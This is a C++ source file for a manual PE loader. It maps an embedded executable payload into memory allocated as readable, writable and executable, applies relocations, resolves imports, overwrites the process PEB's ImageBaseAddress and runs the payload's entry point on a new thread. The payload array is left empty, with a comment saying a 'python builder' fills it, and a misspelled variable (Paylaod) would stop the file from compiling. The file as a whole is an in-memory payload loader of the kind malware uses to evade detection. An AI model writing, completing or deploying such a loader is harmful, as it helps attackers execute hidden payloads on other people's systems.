#include <Windows.h>
#include <winternl.h>
#include <cstdio>  

bool MapAndExecutePE(const BYTE* payloadData, DWORD payloadSize) {
    if (!payloadData || payloadSize < sizeof(IMAGE_DOS_HEADER)) {
        printf("[-] Invalid payload or too small size.\n");
        return false;
    }

    auto* dosHeader = reinterpret_cast<const IMAGE_DOS_HEADER*>(payloadData);
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[-] Invalid DOS signature (Not MZ)\n");
        return false;
    }

    auto* ntHeaders = reinterpret_cast<const IMAGE_NT_HEADERS*>(payloadData + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE || ntHeaders->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) {
        printf("[-] Invalid PE signature or wrong architecture (Only x64 supported)\n");
        return false;
    }

    const auto& optHeader = ntHeaders->OptionalHeader;
    printf("[+] Allocating memory size: 0x%X bytes\n", optHeader.SizeOfImage);
    
    auto* baseAddress = reinterpret_cast<BYTE*>(VirtualAlloc(nullptr, optHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));
    if (!baseAddress) {
        printf("[-] VirtualAlloc failed\n");
        return false;
    }
    printf("[+] Memory allocated successfully at base: %p\n", baseAddress);

 
    CopyMemory(baseAddress, payloadData, optHeader.SizeOfHeaders);
    auto* section = IMAGE_FIRST_SECTION(ntHeaders);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i, ++section) {
        if (section->SizeOfRawData) {
            CopyMemory(baseAddress + section->VirtualAddress, payloadData + section->PointerToRawData, section->SizeOfRawData);
            printf("[+] Section %s mapped at RVA: 0x%X\n", section->Name, section->VirtualAddress);
        }
    }

 
    if (uintptr_t delta = reinterpret_cast<uintptr_t>(baseAddress) - optHeader.ImageBase) {
        auto& relocDir = optHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (relocDir.Size > 0) {
            auto* block = reinterpret_cast<IMAGE_BASE_RELOCATION*>(baseAddress + relocDir.VirtualAddress);
            while (block->VirtualAddress && block->SizeOfBlock) {
                int count = (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                auto* info = reinterpret_cast<WORD*>(block + 1);
                for (int i = 0; i < count; ++i) {
                    if ((info[i] >> 12) == IMAGE_REL_BASED_DIR64) {
                        *reinterpret_cast<uintptr_t*>(baseAddress + block->VirtualAddress + (info[i] & 0x0FFF)) += delta;
                    }
                }
                block = reinterpret_cast<IMAGE_BASE_RELOCATION*>(reinterpret_cast<BYTE*>(block) + block->SizeOfBlock);
            }
            printf("[+] Relocations applied successfully. Delta: 0x%llX\n", (unsigned long long)delta);
        }
    }

 
    auto& importDir = optHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (importDir.Size > 0) {
        auto* importDesc = reinterpret_cast<IMAGE_IMPORT_DESCRIPTOR*>(baseAddress + importDir.VirtualAddress);
        while (importDesc->Name) {
            const char* dllName = reinterpret_cast<const char*>(baseAddress + importDesc->Name);
            HMODULE hDll = LoadLibraryA(dllName);
            if (!hDll) {
                printf("[-] Failed to load dependency: %s\n", dllName);
                return false;
            }

            auto* intThunk = reinterpret_cast<IMAGE_THUNK_DATA*>(baseAddress + importDesc->OriginalFirstThunk);
            auto* iatThunk = reinterpret_cast<IMAGE_THUNK_DATA*>(baseAddress + importDesc->FirstThunk);
            while (intThunk->u1.AddressOfData) {
                FARPROC func = IMAGE_SNAP_BY_ORDINAL(intThunk->u1.Ordinal) ? 
                    GetProcAddress(hDll, reinterpret_cast<LPCSTR>(IMAGE_ORDINAL(intThunk->u1.Ordinal))) : 
                    GetProcAddress(hDll, reinterpret_cast<IMAGE_IMPORT_BY_NAME*>(baseAddress + intThunk->u1.AddressOfData)->Name);
                
                if (!func) {
                    printf("[-] Failed to resolve function from %s\n", dllName);
                    return false;
                }
                iatThunk->u1.Function = reinterpret_cast<uintptr_t>(func);
                intThunk++; iatThunk++;
            }
            importDesc++;
        }
        printf("[+] Import Address Table (IAT) resolved successfully\n");
    }

 
    reinterpret_cast<PVOID*>(reinterpret_cast<PPEB>(__readgsqword(0x60))->Reserved3)[0] = baseAddress;
    printf("[+] PEB ImageBaseAddress hijacked successfully\n");

 
    DWORD_PTR entryPointAddress = reinterpret_cast<DWORD_PTR>(baseAddress) + optHeader.AddressOfEntryPoint;
    printf("[+] Launching thread. EntryPoint: 0x%llX\n\n", (unsigned long long)entryPointAddress);
    printf("[+] Payload Execution:\n--------------------------\n");

    if (auto* hThread = CreateThread(nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(entryPointAddress), nullptr, 0, nullptr)) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
        printf("\n--------------------------\n[+] Payload thread finished execution.\n");
        return true;
    }
    printf("[-] CreateThread failed\n");
    return false;
}

int main() {
 
    unsigned char Payload[] = { /*Payload*/ };
    
 
    DWORD payloadSize = sizeof(Paylaod);

    if (payloadSize > 0) {
        MapAndExecutePE(Payload, payloadSize);
    } else {
        printf("[!] Payload is empty. Fill the array via python builder.\n");
    }
    return 0;
}